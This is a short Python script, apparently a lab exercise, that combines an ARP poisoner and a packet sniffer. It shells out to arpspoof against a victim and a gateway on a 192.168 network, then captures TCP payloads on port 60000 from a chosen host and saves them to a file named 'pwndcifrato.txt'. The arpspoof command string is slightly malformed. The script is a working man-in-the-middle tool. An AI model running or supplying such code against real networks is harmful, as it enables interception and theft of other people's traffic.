import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os

def arpoisoner(out_lck):

    output(out_lck, "Arp Poisoner")

    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    gatewayip = loop_input(out_lck, "Please insert target IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s  scapy%s\"" % ("enx9cebe811a79a", "192.168." + victimip, "192.168." + gatewayip))


def lel(array, out_lck):

    def out_sniff(packet):
        array.append(bytes(packet[TCP].payload))
    return out_sniff


def analyzer(out_lck):
    file = open("received/pwndcifrato.txt", "wb")

    output(out_lck, "Analizer")

    time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")

    destination = loop_input(out_lck, "Please insert destination IP: ")

    array = []
    result = []
    sniff(filter="tcp and port 60000 and host %s" % ("192.168." + destination), timeout=time, prn=lel(array, out_lck))
    for idx, el in enumerate(array):
        if el not in result:
            result.append(el)

    for el in result:
        file.write(el)
    file.close()



